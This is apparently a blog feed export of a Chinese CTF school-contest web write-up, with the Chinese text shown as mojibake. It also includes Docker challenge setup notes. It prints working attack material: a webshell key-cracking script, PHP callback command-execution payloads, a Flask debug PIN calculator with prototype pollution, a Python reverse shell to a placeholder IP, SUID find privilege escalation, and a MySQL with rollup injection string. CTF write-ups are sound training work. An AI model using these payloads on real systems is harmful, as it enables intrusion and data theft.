<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Dockerfile</span></span><br><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.sh /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /flag.sh <span class="comment"># æ‰§è¡Œflag.sh, ä½†æ˜¯æ‰§è¡Œå®Œå°±ä¼šåœæ­¢å®¹å™¨, ä¸æ¸…æ¥šä¸ºä»€ä¹ˆ</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#flag.sh</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag&#123;test&#125;/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/F14g.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line"></span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">service apache2 start <span class="comment">#ä¸å¯åŠ¨å°±ä¼šå¡åœ¨ä¸‹ä¸€æ­¥</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null <span class="comment">#èƒ½å¤Ÿè®©flag.shæ‰§è¡Œå®Œä¹‹åä¸ä¼šåœæ­¢å®¹å™¨</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97.html#%E6%80%BB%E7%BB%93">https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97.html#%E6%80%BB%E7%BB%93</a></p>
<p><a href="https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/">https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/</a></p>
</blockquote>
<p>å¦‚æœé‡ä¸Šè¦æ‹‰å–çš„é•œåƒå¤ªå¤§çš„æ—¶å€™, å¯ä»¥æ›´æ¢aptæºå’Œpipæº, èƒ½å¤Ÿæé«˜é€Ÿåº¦</p>
<p>åªéœ€è¦åœ¨æ·»åŠ ä¸€ä¸ªsource.liståœ¨ç›®å½•ä¸­,, ä¸€èˆ¬æ˜¯Dockerfileçš„åŒçº§ç›®å½•</p>
<p>é‡Œé¢å¡«ä¸Šéœ€è¦æ›´æ¢çš„aptæº</p>
<p>åœ¨Dockerfileé‡ŒåŠ ä¸Š<code>ADD ./sources.list /etc/apt</code></p>
<p>pipæ›´æ–°çš„è¯ç”¨è¿™ä¸ª</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install --upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Chive ctfæ ¡èµ›wp-nanamoç‰ˆæœ¬-WEB</title>
    <url>/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/</url>
    <content><![CDATA[<h2 id="Hacker-ouT"><a href="#Hacker-ouT" class="headerlink" title="Hacker ouT!"></a>Hacker ouT!</h2><p>ç­¾åˆ°é¢˜ç›®, æƒ³åŠæ³•ä¿®æ”¹<code>cookie</code>çš„<code>user</code>ä¸ºadminå°±å¯ä»¥äº†<br>åŠæ³•å¤ªå¤šäº†, ç›´æ¥<code>devtools</code>è§£å†³æœ€ç®€å•</p>
<h2 id="å†·å†½è°·çš„å“¥æ–¯æ‹‰"><a href="#å†·å†½è°·çš„å“¥æ–¯æ‹‰" class="headerlink" title="å†·å†½è°·çš„å“¥æ–¯æ‹‰"></a>å†·å†½è°·çš„å“¥æ–¯æ‹‰</h2><p>é¢˜ç›®ä¸ç®—å¤ªéš¾, ä½†æ˜¯å¯èƒ½å¤§éƒ¨åˆ†äººæ²¡æœ‰è§è¿‡æ‰€ä»¥ä¸å¤ªå¥½åš</p>
<p>é¦–å…ˆæ‰«äº†ä¸€ä¸‹ç½‘é¡µ, æ²¡æ‰¾åˆ°å•¥æœ‰ç”¨çš„, å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€é<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404092006278.png" alt="image.png"><br>è®¿é—®<code>shell.jsp</code>, <code>ctrl+u</code>æŸ¥çœ‹æºç <br>æœ‰äº†è§£è¿‡çš„åº”è¯¥èƒ½çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯ä¸€ä¸ªé­”æ”¹çš„å“¥æ–¯æ‹‰ğŸ, æ ¼å¼æ˜¯<code>jsp base64</code>, ç»™å‡ºçš„</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xxxx</span> <span class="operator">=</span> <span class="string">&quot;ffe3f468070ae0da&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">pppp</span> <span class="operator">=</span> <span class="string">&quot;Noz0m1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>åº”è¯¥å°±æ˜¯åŸå§‹å“¥æ–¯æ‹‰ğŸä¸­çš„</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">String pass=<span class="string">&quot;pass&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å“¥æ–¯æ‹‰è¿æ¥éœ€è¦<code>pass</code>å’Œ<code>key</code>, <code>pass</code>å°±æ˜¯<code>Noz0m1</code><br>é€šè¯»ä¸€ä¸‹, æ–‡ä»¶å°±æ˜¯åšäº†ä¸€ä¸‹æ··æ·†, æ²¡æœ‰åŠ¨åˆ«çš„é…ç½®, æ‰€ä»¥æ¥ä¸‹æ¥, æˆ‘ä»¬éœ€è¦æ‹¿åˆ°<code>key</code>, è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸‹å“¥æ–¯æ‹‰ğŸçš„ç”Ÿæˆæœºåˆ¶, è¿™é‡Œç›´æ¥ç»™å‡º, æ–‡ä»¶ä¸­çš„<code>ffe3f468070ae0da</code>æ˜¯<code>key</code>ç»è¿‡<code>md5</code>åçš„å‰16ä½, æ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°è¯•çˆ†ç ´, è®©gptå†™äº†ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„MD5å¯†æ–‡å‰16ä½</span></span><br><span class="line">known_prefix = <span class="string">&quot;ffe3f468070ae0da&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_md5</span>(<span class="params">known_prefix</span>):</span><br><span class="line">    characters = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éå†æ˜æ–‡é•¿åº¦ä»1åˆ°6</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">        <span class="comment"># ç”Ÿæˆæ‰€æœ‰é•¿åº¦ä¸ºlengthçš„æ˜æ–‡ç»„åˆ</span></span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(characters, repeat=length):</span><br><span class="line">            plain_text = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">            full_hash = hashlib.md5(plain_text.encode()).hexdigest()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\rCurrent plaintext: <span class="subst">&#123;plain_text&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å¦‚æœå‰16ä½åŒ¹é…ï¼Œåˆ™è¾“å‡ºç»“æœ</span></span><br><span class="line">            <span class="keyword">if</span> full_hash[:<span class="number">16</span>] == known_prefix:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\nFound matching plain text:&quot;</span>, plain_text)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Full MD5 hash:&quot;</span>, full_hash)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting MD5 cracking...&quot;</span>)</span><br><span class="line">crack_md5(known_prefix)</span><br></pre></td></tr></table></figure>
<p>ç¨å¾®ç­‰ä¸€ä¼š, èƒ½å¤Ÿçˆ†å‡ºæ¥<code>key</code>æ˜¯<code>chive</code>, ç”¨å“¥æ–¯æ‹‰è¿æ¥, æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404092032419.png" alt="image.png"><br>ç„¶åè¿›å»<code>cat /flag</code>æ‹¿åˆ°flagå°±è¡Œäº†</p>
<h2 id="php-tricks"><a href="#php-tricks" class="headerlink" title="php_tricks"></a>php_tricks</h2><p>å€Ÿé‰´äº†çŸ¥è¯†æ˜Ÿçƒçš„é¢˜ç›®, ä¹‹å‰å’ŒæŸxyctfå‡ºé¢˜å¸ˆå‚…è®¨è®ºè¿‡, æ‰€ä»¥æ‹¿æ¥å‡ºé¢˜äº†<br>(åæ¥å‘ç°è²Œä¼¼è€ƒç‚¹2flag.phpå¿˜è®°åŠ æ˜¾ç¤ºæºç äº†, æ‰€ä»¥å°±å½“æ²¡æœ‰ç®—äº†(-&lt;-)</p>
<p>é¢˜ç›®æ„æ€å¾ˆç®€å•, æ¥æ”¶getå‚æ•°å’Œpostå‚æ•°, getå‚æ•°æ„æˆ<code>call_user_func</code>çš„ä¸¤ä¸ªå‚æ•°, postå‚æ•°æ„æˆå¯å˜å‡½æ•°</p>
<p>æ€è·¯æ˜¯æ‰¾åˆ°åˆé€‚çš„å›è°ƒå‡½æ•°, å°†æœ€åä¸€å±‚æ„é€ æˆè¯¸å¦‚<code>system(&#39;ls&#39;)</code>è¿™æ ·çš„æ ¼å¼<br>ä¸‹ä¸€æ­¥æ˜¯æ„é€ å¤–é¢ä¸€å±‚, ä¹Ÿå°±æ˜¯æ„é€ <code>call_user_func</code>å›è°ƒå‡½æ•°, </p>
<p>æˆ‘çš„æ€è·¯å¦‚ä¸‹, å› ä¸º<code>$parameters</code>å˜é‡æ˜¯ä¸€ä¸ªæ•°ç»„, æ‰€ä»¥åˆ©ç”¨<code>array_key_first</code>å–å‡ºäº†æ•°ç»„çš„ç¬¬ä¸€ä¸ªkeyä¹Ÿå°±æ˜¯<code>utf8_decode</code><br><code>utf8_decode($_POST[&#39;a&#39;])</code>å¯¹æˆ‘è¾“å…¥çš„aå¹¶ä¸ä¼šäº§ç”Ÿä»€ä¹ˆå½±å“, ç»“æœå°±æ˜¯<code>system</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fyuction=array_key_first&amp;utf8_decode=1</span><br><span class="line">post: a=system&amp;b=ls</span><br></pre></td></tr></table></figure>
<p>å¦ä¸€ä¸ªå¸ˆå‚…æ€è·¯å¦‚ä¸‹, <code>current</code>é»˜è®¤æ˜¯æ•°ç»„çš„ç¬¬ä¸€é¡¹, åé¢æ€è·¯å°±ä¸€æ ·äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fyuction=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒeasy~</p>
<h2 id="iTâ€™s-MyPin"><a href="#iTâ€™s-MyPin" class="headerlink" title="iTâ€™s MyPin"></a>iTâ€™s MyPin</h2><p>æ¯”è¾ƒéº»çƒ¦, ä½†æ˜¯ä¸éš¾çš„ä¸€ä¸ªé¢˜ç›®</p>
<p>é¦–å…ˆé¢˜ç›®ç»™å‡ºäº†æºç , (ä¸æ–¹ä¾¿é˜…è¯»å°±ctrl+uçœ‹æºç )ä»”ç»†é˜…è¯»ä¹‹å, å‘ç°<code>debug=True</code>å¼€å¯äº†flaskçš„debugæ¨¡å¼, è¿™ä¸ªç»å¸¸è€ƒåˆ°ç®—pinç rce</p>
<p>åœ¨<code>/api</code>è·¯ç”±ä¸­, æœ‰ä¸ªå…¸å‹çš„mergeå‡½æ•°, åšè¿‡é¢˜ç›®çš„åº”è¯¥çŸ¥é“æ˜¯<code>åŸå‹é“¾æ±¡æŸ“</code>çš„ä¸€ä¸ªæ ‡å¿—äº†, æ²¡åšè¿‡çš„æœä¸€ä¸‹è¿™ä¸ªå¥‡æ€ªçš„å‡½æ•°ä¹Ÿå¾ˆå®¹æ˜“æœåˆ°, ç»“æ„æˆ‘æ˜¯æ²¡æœ‰ä¿®æ”¹çš„, è¿™é‡Œæ˜¯å°†postä¼ å…¥çš„æ•°æ®mergeç»™äº†instance, è¿™æ ·åšå®é™…ä¸Šæˆ‘ä»¬å¯ä»¥æ„é€ è¯·æ±‚ä½“æ¥æ§åˆ¶ä»»æ„å˜é‡, ä¸‹é¢æœ‰ä¸ª<code>__file__</code>æ­£å¥½è¢«è¯»å–äº†, å¯ä»¥è¯•ç€ä¿®æ”¹è¿™ä¸ªå˜é‡æ¥åšä»»æ„æ–‡ä»¶è¯»å–</p>
<p>æ ¼å¼ä¸å”¯ä¸€, å…·ä½“å¯ä»¥æŸ¥çœ‹ç½‘ä¸Šå…³äºpythonåŸå‹é“¾æ±¡æŸ“çš„æ–‡ç« , æˆ‘è¿™é‡Œç”¨çš„è¿™ä¸ª</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>POSTå‘é€è¯·æ±‚ä¹‹å, å†æ¬¡æŸ¥çœ‹<code>/</code>è·¯ç”±, å‘ç°debugé¡µé¢æç¤ºæŠ¥é”™<code>Permission denied: &#39;/flag&#39;</code><br>è¿™é‡Œæ˜¯å› ä¸ºæˆ‘æŠŠ<code>/flag</code>è®¾ç½®ä¸ºäº†rootç”¨æˆ·æƒé™, ä½†æ˜¯flaskæ˜¯momoç”¨æˆ·åœ¨è¿è¡Œ, è¯»å–<code>/etc/passwd</code>æ˜¯å¯ä»¥çŒœåˆ°çš„</p>
<p>ç»“åˆä¹‹å‰æåˆ°çš„pinç , æˆ‘ä»¬è¯•ç€è¯»å–ä¸€ä¸‹è®¡ç®—pinç æ‰€éœ€è¦çš„æ–‡ä»¶</p>
<p>åœ¨åˆšæ‰çš„æŠ¥é”™ç•Œé¢ä¸­å¯ä»¥æ‰¾åˆ°pythonç‰ˆæœ¬ä¸º3.8, é«˜ç‰ˆæœ¬ç”¨sha1çš„è®¡ç®—è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;momo&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;156525269814096&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address å†’åˆ†16è¿›åˆ¶è½¬10è¿›åˆ¶, æˆ‘ä¹ æƒ¯å»æ‰å†’å·åœ¨devtoolsé‡Œé¢0x...ç›´æ¥å¾—åˆ°</span></span><br><span class="line">    <span class="comment"># machine_id ä¸€èˆ¬ = /etc/machine-id+/proc/self/cgroupçš„æ–œæ ååŠæ®µ, çœŸæœºä¸‰ä¸ªä¸€èµ·ç”¨ï¼š</span></span><br><span class="line">    <span class="comment"># 1./etc/machine-id = ea1fc30b6f4a173cea015d229c6b55b6</span></span><br><span class="line">    <span class="comment"># 2./proc/sys/kernel/random/boot_id = e1fca593-dd38-4d12-bb7e-d6bf6cde6cbb (ç”¨ä¸åˆ°)</span></span><br><span class="line">    <span class="comment"># 3./proc/self/cgroup = cri-containerd-5500ffd3801380b91976ea5b9e0ac8b7f208ab72a99bab34af7a8fb0c99e7791.scope</span></span><br><span class="line">    <span class="comment"># è¿™é‡Œå› ä¸ºæ˜¯k3såç«¯, æ‰€ä»¥/proc/self/cgroupä¸æ˜¯å¸¸è§çš„ç±»å‹, ä½†æ˜¯æ ¼å¼åŒdocker </span></span><br><span class="line">    <span class="string">&#x27;ea1fc30b6f4a173cea015d229c6b55b6cri-containerd-5500ffd3801380b91976ea5b9e0ac8b7f208ab72a99bab34af7a8fb0c99e7791.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘çš„è®¡ç®—ç»“æœ<code>193-344-993</code>, åœ¨æŠ¥é”™ç•Œé¢æ‰¾åˆ°ç»ˆç«¯çª—å£æˆ–è€…ç›´æ¥è®¿é—®<code>/console</code>è·¯ç”±, è¾“å…¥pinç å¯ä»¥è¿›å…¥pythonç»ˆç«¯<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404131302957.png" alt="image.png"></p>
<p>ç„¶åå°±æ˜¯è¿™ä¸ªé“ç†äº†, åé¢æˆ‘ä¹ æƒ¯åå¼¹shellå›æ¥, æˆ–è€…ä½ ç›´æ¥ç”¨ä¸‹é¢è¿™å¥ä¹Ÿè¡Œ, è¿™é‡Œè€ƒçš„å°±æ˜¯suidææƒäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.popen(<span class="string">&#x27;/usr/bin/find /flag -exec bash -p -c &quot;cat /flag&quot; \;&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…åå¼¹ä¸€ä¸ªshellä¼šæ›´ç®€å•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;xx.xx.xx.xx&quot;</span>,<span class="number">7210</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å½“å‰ç”¨æˆ·æ˜¯momo , ä¹Ÿæ˜¯éœ€è¦suidææƒ, é™¤äº†ä¸Šé¢é‚£å¥è¿˜å¯ä»¥ç”¨è¿™å¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /flag -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
<p>æ‹¿ä¸‹äº†~</p>
<h2 id="jenkinslove"><a href="#jenkinslove" class="headerlink" title="jenkinslove"></a>jenkinslove</h2><p>ç®€å•çš„ä¸€é“cve, æ²¡å•¥å¤ªéš¾çš„, å°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªå°å‘, flagå¹¶æ²¡æœ‰æ”¾åœ¨&#x2F;flagä¸­, æ‰€ä»¥éœ€è¦è¯»ä¸€ä¸‹åˆ«çš„ä¸œè¥¿, å‚è€ƒpç‰›çš„æ–‡ç« </p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html">Jenkinsæ–‡ä»¶è¯»å–æ¼æ´æ‹¾é—ï¼ˆCVE-2024-23897ï¼‰ | ç¦»åˆ«æ­Œ</a></p>
</blockquote>
<p>é‡Œé¢æåˆ°äº†ä¸¤ç§è¯»å–æ–‡ä»¶çš„æ–¹æ³•, ç¬¬ä¸€ç§åªèƒ½è¯»å–ä¸€è¡Œ, æˆ‘åœ¨&#x2F;flagä¸­çš„ç¬¬ä¸€è¡Œå†™çš„æ˜¯<br><code>nanamo_flag is not here,but ...</code></p>
<p>å¦‚æœæœ‰å¿ƒçš„è¯çœ‹åˆ°ä¸‹é¢æœ‰ä¸ªåŒ¿åç”¨æˆ·å¯è¯»å…¨éƒ¨æ–‡ä»¶å†…å®¹çš„æ–¹æ³•, è¯•è¯•è¿™ä¸ªå¯ä»¥å¾—åˆ°&#x2F;flagå†…å®¹æ˜¯<br><code>nanamo_flag is not here,but ...  </code>maybe environ?&#96;</p>
<p>æç¤ºè¯»å–ç¯å¢ƒå˜é‡, è¿™é‡Œè¯»å–æœ‰æ—¶å€™éœ€è¦ç”¨&#x2F;&#x2F;ä½œä¸ºiç¬¬ä¸€ä¸ª&#x2F;, æ³¨æ„ä¸€ä¸‹å°±è¡Œ<br>åšè¿‡webçš„å¤§æ¦‚çŸ¥é“è¿™ä¸ªenvironæŒ‡ä»£çš„æ˜¯ä»€ä¹ˆ, æ²¡åšè¿‡çš„, æœä¸€ä¸‹ä¹Ÿå¾ˆå®¹æ˜“å¾—åˆ°<br><code>/proc/$PID/environ</code><br>å¦‚æœä½ ç”¨çš„æ˜¯<code>/proc/self/environ</code>, é‚£æ˜¯è¯»ä¸å‡ºæ¥çš„, å› ä¸ºè¿™ä¸ªå®¹å™¨çš„å…¥å£æ˜¯æˆ‘è®¾ç½®çš„<code>docker-entrypoint.sh</code>, flagä¹Ÿæ˜¯åœ¨è¿™é‡Œé¢è¿›è¡Œäº†åŠ è½½, æ‰€ä»¥flagè—åœ¨äº†<br><code>/proc/1/environ</code>ä¸­</p>
<p>å…¶å®æœ‰çš„ctfä¹Ÿä¼šå‡ºè¿™æ ·çš„éé¢„æœŸè§£, å¹²è„†å°±æ‹¿è¿‡æ¥ç”¨äº†</p>
<h2 id="æ±‡æ€»"><a href="#æ±‡æ€»" class="headerlink" title="æ±‡æ€»"></a>æ±‡æ€»</h2><p>è¿™ä¸ªé¢˜ç›®åæ¥æ·»åŠ äº†æç¤º, ä½†æ˜¯æ²¡åšè¿‡çš„å¸ˆå‚…åº”è¯¥è¿˜æ˜¯æ¯”è¾ƒé›¾æ°´çš„<br>å®é™…è¿™é“é¢˜æ˜¯ä¸€ä¸ªwith rollupæ³¨å…¥, å€Ÿé‰´äº†<br><a href="https://guokeya.github.io/post/KQHBR3liu/"> Mysql with rollupæ³¨å…¥(ISCC-2018 çº¿ä¸‹èµ›Web ç§åœ°ä¸€) </a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404131529950.png" alt="image.png"></p>
<p>ç•Œé¢å¾ˆæœ´ç´ , ä¸‹é¢ç»™äº†æç¤º, å°è¯•å’Œæç¤ºç»™äº†adminå’Œrootç”¨æˆ·, è¾“å…¥è¿™ä¸¤ä¸ªç”¨æˆ·çš„è¯æ˜¯å¯†ç é”™è¯¯</p>
<p><code>Executed Operations</code>ä¸­å‘ç°, åªæŸ¥è¯¢äº†ç”¨æˆ·å, è¿™æ˜¯æ¯”è¾ƒå¥‡æ€ªçš„, è€Œä¸”å¯†ç å¾ˆæœ‰å¯èƒ½æ˜¯æ‹¿<br>æ¥å’Œè¾“å…¥çš„å¯†ç ä½œæ¯”è¾ƒ, è¿›è¡Œé‰´æƒ</p>
<p>å¦‚æœå°è¯•äº†ä¸€å¥è¯å¯†ç , åˆ™ä¼šçˆ†å‡º<code>results are more than one</code>, æ‰€ä»¥çŒœæµ‹éœ€è¦å¾—åˆ°ä¸€ä¸ªæŸ¥è¯¢ç»“æœçš„å¯†ç å’Œæˆ‘ä»¬è¾“å…¥çš„å¯†ç ç›¸åŒæ‰å¯ä»¥</p>
<p>äºæ˜¯<code>with roll up</code>, é»‘åå•åŸºæœ¬å¯ä»¥æ— è§†, ç©ºæ ¼ç”¨<code>/**/</code>urlç¼–ç åç»•è¿‡å³å¯<br>æŸ¥è¯¢ç»“æœä¼šå˜æˆä¸€ä¸ªnull, ç”±äºåå°å¼±æ¯”è¾ƒ, æˆ‘ä»¬ä¸è¾“å…¥å¯†ç å°±å¯ä»¥æ‹¿åˆ°flagäº†</p>
<p>è¿™é“ä¸»è¦è¿˜æ˜¯é ç»éªŒäº†, åŸç†çš„è¯æ¨èè‡ªå·±ç”¨æ•°æ®åº“åšä¸€ä¸‹å®éªŒ, å¯ä»¥çœ‹æˆ‘ä¸Šé¢é“¾æ¥çš„æ–‡ç« å’Œè‡ªå·±è¡¥å……ç½‘ç»œçŸ¥è¯†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;/**/group/**/by/**/password/**/with/**/rollup/**/limit/**/1/**/offset/**/1#&amp;password=</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Safety</tag>
        <tag>CTF</tag>
        <tag>Cve</tag>
        <tag>Python</tag>
        <tag>php</tag>
      </tags>
  </entry>
</search>
